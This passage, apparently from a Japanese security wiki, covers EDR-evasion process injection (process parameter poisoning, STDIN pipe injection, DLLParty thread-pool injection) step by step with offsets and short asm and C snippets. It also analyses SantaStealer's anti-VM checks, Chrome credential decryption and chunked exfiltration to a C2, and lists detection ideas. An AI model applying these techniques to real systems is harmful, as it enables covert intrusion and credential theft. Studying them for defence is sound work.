4. `NtSetContextThread`（`CONTEXT_CONTROL`、`RIP` を上書き）で実行先を変更する

従来の thread hijacking の手順とは異なり、`SuspendThread` / `ResumeThread` は**不要です**。返されたメインスレッドのハンドルに対して、直接コンテキストを変更できます。

これにより、インジェクションで一般的に監視される次の API の使用を回避できます。

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 多くの場合、`SuspendThread` / `ResumeThread` も

### Null バイトの制限とステージ式 shellcode

3 つのキャリアはいずれも**文字列または文字列のようなデータ**であるため、`0x00` を含む raw payload は転送中に切り詰められます。実用的な回避策は、実行時に定数を再構築してから任意の第 2 ステージを読み込む、**null-free の第 1 ステージ**を使うことです。

単純なパターンとして、XOR ベースの定数合成があります。

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

これにより、第1段階は、転送されるパラメーターに null byte を埋め込まずに、スタック上に文字列、API 引数、DLL パス、または第2段階の shellcode loader を構築できます。

### 第1段階からのスタックベースの API 呼び出し

第1段階で `LoadLibraryA` などの API を呼び出す必要がある場合、次のようにできます。

- 文字列/バッファーを対象プロセスのスタックに push する
- **32-byte x64 shadow space** を確保する
- `RCX`、`RDX`、`R8`、`R9` に定数または `RSP` 相対ポインターを設定する
- 呼び出し前に `RSP` を **16-byte aligned** に保つ

その後、第2段階をスタックから `PAGE_READWRITE` のメモリー領域にコピーし、`VirtualProtect` で `PAGE_EXECUTE_READ` に変更してからジャンプすることで、直接の RWX 割り当てを回避できます。

### 検知のアイデア

著者が挙げた有効なハンティング機会:

- `VirtualProtectEx` / `NtProtectVirtualMemory` による**プロセスパラメーターのページの実行可能化**
- その保護属性の変更に続く `SetThreadContext` / `NtSetContextThread`
- `PEB`、続いて `RTL_USER_PROCESS_PARAMETERS` のリモート読み取り
- プロセス作成時の `lpCommandLine`、`lpEnvironment`、または `STARTUPINFO.lpReserved` の値が異常に長い、またはエントロピーが高い

### 注意事項

- P3 は**プロセス間転送のトリック**であり、それ単体では完全な実行プリミティブではありません。コピーされたパラメーターには、実行権限への変更と実行先のリダイレクト方法が別途必要です。
- `RtlCreateProcessReflection` / Dirty Vanity は著者らも検討しましたが、内部で `NtWriteVirtualMemory` や `NtCreateThreadEx` といった疑わしいプリミティブに到達するため、採用しませんでした。

## コンソール STDIN パイプインジェクション

対話型コンソールの子プロセスを**ペイロード転送プリミティブ**として使うこともできます。インジェクターは子プロセスの標準入力をパイプにリダイレクトし、マーカーに続けて shellcode を送信します。コンソールプログラムがデータを自身のプライベートメモリーに読み込んだ後、インジェクターはそのバッファーを見つけ、実行可能にして、子スレッドの実行先をそこへリダイレクトします。これにより `VirtualAllocEx` と `WriteProcessMemory` は回避できますが、これは依然としてプロセスインジェクションであり、汎用的な EDR バイパスではありません。<sup>[[41]](#references)</sup>

「named-pipe」という説明とは異なり、参考実装では `CreatePipe` を呼び出しており、作成されるのは**匿名パイプ**です。Windows は匿名パイプを内部で一意の名前を持つパイプオブジェクトとして実装しますが、この PoC は `\\.\pipe\<name>` のパスを指定せず、`CreateNamedPipe` も呼び出しません。既定のセキュリティ記述子を使って継承可能なハンドルを作成し、読み取りハンドルを `STARTUPINFO.hStdInput` に設定し、`STARTF_USESTDHANDLES` を指定して、ハンドル継承を有効にした状態で新しい子プロセスを起動します。したがって、この PoC は指定されたコンソール実行ファイルを起動するものであり、既存のプロセスにパイプを接続するものではありません。<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### 参考ワークフロー

実装では、次の手順を使用します。<sup>[[41]](#references)</sup>

1. 子プロセスの `STDIN` と `STDOUT` 用に匿名パイプのペアを作成する。親側の2つのハンドルの継承を無効にし、プロセス作成後に親プロセス内の子側ハンドルの複製を閉じる。
2. `CREATE_NEW_CONSOLE` を指定して、`netsh.exe` や `nslookup.exe` などの対話型実行ファイルを起動する。子プロセスはリダイレクトされた標準ハンドルを継承する。
3. 親側の `STDIN` ハンドルを通じて `WriteFile` で完全なバイナリ `rawData` 配列を送信する。コンソールプログラムがバイト列を消費し、そのコピーを自身のプライベートなコミット済み領域の1つに残す。
4. `VirtualQueryEx` で子プロセスのアドレス空間を調べ、`ReadProcessMemory` で `MEM_PRIVATE` の候補領域を読み取り、`rawData` の先頭にあるマーカーを検索する。
5. `VirtualProtectEx` で見つかったバッファーを `PAGE_EXECUTE_READWRITE` に変更する。
6. メインスレッドを特定して中断し、`NtSetContextThread` で `RIP` を `found_address + 0x19` に設定してから再開する。

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

提供された実装はx64専用です。`CONTEXT.Rip`を変更し、埋め込まれたpayloadはx64 shellcodeです。`rawData`は25バイトのmarkerで始まるため、実行可能なバイト列は16進オフセット`0x19`から始まります。payloadを置き換える場合は、このレイアウトを維持するか、marker、検索vector、配列サイズ、実行オフセットをまとめて更新してください。ソースコメントには、`0x0A`、`0x0D`、`0x1A`もbad characterとして記載されています。このworkflowでは子プロセスのtokenやprivilegeは変更しません。<sup>[[41]](#references)</sup>

小規模なネイティブhelperやpayloadのコンパイルパターンについては、[Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md)を参照してください。

## shellcodeを使わないthread-pool callback DLL injection（DLLParty）

DLLPartyはPoolParty形式のthread-pool injectionを応用し、既存のtarget workerに、注入したcallback stubを実行させるのではなく`LoadLibraryA`を呼び出させます。dispatch primitiveには、target poolのI/O completion portにキューイングする`TP_DIRECT` completionを使います。これはprocess permissionを回避するものではありません。PoCは`OpenProcess(PROCESS_ALL_ACCESS)`を呼び出し、読み書き可能なtarget memoryと、複製可能なworker-factoryおよびcompletion-port handleを必要とします。<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64では、workerはstack上にある`TP_CALLBACK_INSTANCE`へのpointerを、最初のcallback argumentとして`RCX`に渡します。`LoadLibraryA`は同じpointerを`LPCSTR`として解釈します。テストした実行経路では、`TppWorkerThread`は`RSP+0x178`にpointerを作成し、そのobjectへの最初の通常の書き込みは`RSP+0x1d0`で行われます。そのため、0x58バイトのprefixに収まるnull終端DLL pathであれば、dispatch前に上書きされず、instanceの先頭に配置できます。これは特定のbuildでの観察結果であり、文書化されたWindows ABIの保証ではありません。<sup>[[46]](#references)[[47]](#references)</sup>

参考workflowは次のとおりです。<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)`でtargetのhandleを列挙し、object typeを照会して`TpWorkerFactory`を特定します。worker-factory handleを複製し、`WorkerFactoryBasicInformation`を照会します。`StartParameter`からremoteの`TP_POOL`が得られます。`TotalWorkerCount == 0`のfactoryはスキップします。
2. `TP_POOL.CompletionPort`を読み取り、poolのprivate worker listをたどります。テスト対象のWindows 10 19045 x64 build（`ntdll.dll 10.0.19041.4842`）では、headは`pool+0x60`にあり、各linkは`worker+0x10`にあります。そのため、`worker+0x38`のcallback-instance slotは`link+0x28`と一致します。PoCはpointer alignment、linkの相互参照、poolの所有関係、nonzero thread ID、重複node、安定したlist headを確認します。
3. キューイングされたcompletionはどのworkerにも処理される可能性があるため、見つかった**すべての**worker slotにDLL pathを書き込みます。書き込み可能なtarget memoryに、`Callback = LoadLibraryA`となる`TP_DIRECT`を配置します。PoCは`VirtualAllocEx`の代わりにworker stack上の`last_slot-0x500`を使います。このoffsetは実験的なものであり、使用中のstack dataと衝突しないようにしてください。
4. targetのcompletion-port handleを複製し、`ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`を呼び出します。remoteの`TP_DIRECT` addressがcompletion keyです。既存のworkerが上書きされたcallback-instance pointerを使って`LoadLibraryA`を呼び出し、targetからアクセス可能なDLLをロードします。

PoCはtarget PID（`DLLParty.exe <target_pid>`）を受け取り、`DLLParty.cpp`内にhard-codeされたDLL pathを使います。build前に、targetからアクセス可能なpathを設定し、x64 executableをビルドしてください。また、自プロセスの`LoadLibraryA` addressをremote callbackとして使うため、そのaddressがtargetでも有効であることを前提としています。コードはpathの長さが0x58-byte prefixに収まるか、worker traversalでslotが見つかってから最後の要素を参照しているかを確認しません。target buildのprivate offset、stack layout、書き込み可能領域を再検証してください。`CreateRemoteThreadEx`、shellcode、`VirtualAllocEx`を省いても、process間の書き込みやDLL loadのtelemetryがなくなるわけではありません。<sup>[[46]](#references)[[47]](#references)</sup>

## Fileless evasionとcredential theftのためのSantaStealerの手法

SantaStealer（別名BluelineStealer）は、現代のinfo-stealerがAV bypass、anti-analysis、credential accessを単一のworkflowに組み合わせる例です。<sup>[[24]](#references)</sup>

### Keyboard layoutによる制限とsandboxでの遅延

- config flag（`anti_cis`）は`GetKeyboardLayoutList`でインストール済みkeyboard layoutを列挙します。Cyrillic layoutが見つかると、サンプルは空の`CIS` markerを作成して終了します。これにより、除外対象のlocaleではstealerを実行せず、調査に利用できる痕跡を残します。

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### 多層化された `check_antivm` ロジック

- Variant A はプロセス一覧を走査し、各プロセス名を独自のローリングチェックサムでハッシュ化して、デバッガー／sandbox 用の埋め込みブロックリストと照合する。コンピューター名にも同じチェックサムを適用し、`C:\analysis` などの作業ディレクトリも確認する。
- Variant B はシステムプロパティ（プロセス数の下限、直近の稼働時間）を調べ、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox additions を検出し、スリープ前後のタイミングを確認して single-stepping を検知する。いずれかに該当すると、モジュールの起動前に処理を中断する。

### Fileless helper と二重 ChaCha20 reflective loading

- メインの DLL/EXE には Chromium の credential helper が埋め込まれており、ディスクに書き出すか、メモリ内に手動で map される。fileless モードでは helper が自ら import と relocation を解決するため、helper の痕跡はディスクに残らない。
- この helper は、ChaCha20 で二重に暗号化された第 2 段階の DLL を保持する（32 バイトの key が 2 つ、12 バイトの nonce が 2 つ）。両方の復号処理後、blob を reflective loading（`LoadLibrary` は使用しない）し、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来する `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export を呼び出す。<sup>[[25]](#references)</sup>
- ChromElevator のルーチンは direct-syscall reflective process hollowing を使って稼働中の Chromium browser に inject し、AppBound Encryption の key を継承して、ABE の hardening にもかかわらず、SQLite database から password、cookie、credit card 情報を直接復号する。

### モジュール式のメモリ内収集と分割 HTTP exfil

- `create_memory_based_log` はグローバルな `memory_generators` 関数ポインタテーブルを順に処理し、有効なモジュール（Telegram、Discord、Steam、screenshot、document、browser extension など）ごとに thread を 1 つ起動する。各 thread は共有 buffer に結果を書き込み、約 45 秒の join 後にファイル数を報告する。
- 完了後、静的リンクされた `miniz` library を使い、すべてのデータを `%TEMP%\\Log.zip` に圧縮する。続いて `ThreadPayload1` は 15 秒間 sleep し、archive を 10 MB の chunk に分けて `http://<C2>:6767/upload` へ HTTP POST で送信する。その際、browser の `multipart/form-data` boundary（`----WebKitFormBoundary***`）を偽装する。各 chunk には `User-Agent: upload`、`auth: <build_id>`、任意の `w: <campaign_tag>` が含まれ、最後の chunk には `complete: true` が追加され、C2 に再構成の完了を知らせる。

## References

- [1] [高度な Evasion Tradecraft：Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – ブログ](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack：malware に甘い対応はもう許されない](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – ドキュメント](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – サンプル](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – サンプル](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – 新たな感染チェーンと、DarkCloud Stealer における ConfuserEx ベースの難読化](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – ゼロトラストを信頼すべきか？Zscaler の posture check を bypass する](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell 以前：Storm-2603 の過去の ransomware 活動を探る](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading：Forwarded Export の悪用](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Export 一覧（apis_fwd.txt）](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library の検索順序](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process のセキュリティとアクセス権](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU リファレンス（MS-PPSEC）](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light（PPL）を活用した EDR 対策](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique による Windows Defender の防御を突破する](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink コマンドのリファレンス](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – 純白の幕の内側：RAT から Builder、そして Coder へ](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer がやって来る：新たな野心的 Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption の復号](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader：API Tracing による Node.js malware の無力化](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty：Crystal Palace で Adaptix を眠らせる](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II：CFG、CET、Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW を隠す](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team 作戦における Chrome Remote Desktop の悪用：実践ガイド](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged：Defender の Remediation Driver を Kernel Operation Primitive として weaponize する](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo の companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo：LLVM を使った Self-Masking Function の作成](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole のソース](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe 関数](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - リダイレクトされた入力と出力を使った Child Process の作成](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy：WasmForge で C# ツールを再構築する](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - C# / .NET Project のコンパイル](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty の proof-of-concept とソース](https://github.com/epersic/DLLParty)
- [47] [DLLParty — shellcodeless DLL injection のための thread pool 内部構造の悪用](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
{{#include ../banners/hacktricks-training.md}}
